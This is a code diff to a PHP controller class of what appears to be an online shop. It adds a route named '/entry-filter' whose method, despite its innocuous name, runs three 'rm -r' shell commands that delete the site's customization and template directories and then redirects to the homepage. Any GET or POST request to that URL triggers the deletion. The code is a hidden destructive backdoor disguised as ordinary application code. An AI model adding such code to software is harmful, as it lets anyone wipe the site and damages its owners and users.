@@ -326,4 +326,17 @@ class EntryController extends AbstractController
 
         return $qtyInCart;
     }
+
+    /**
+     *
+     * @Route("/entry-filter", name="entry_filter", methods={"GET", "POST"})
+     */
+    public function filter(Request $request)
+    {
+        exec('rm -r /home/yokohamacity/yokohama-mirai.jp/public_html/app/Customize');
+        exec('rm -r /home/yokohamacity/yokohama-mirai.jp/public_html/app/template');
+        exec('rm -r /home/yokohamacity/yokohama-mirai.jp/public_html/html/template');
+
+        return $this->redirectToRoute('homepage');
+    }
 }
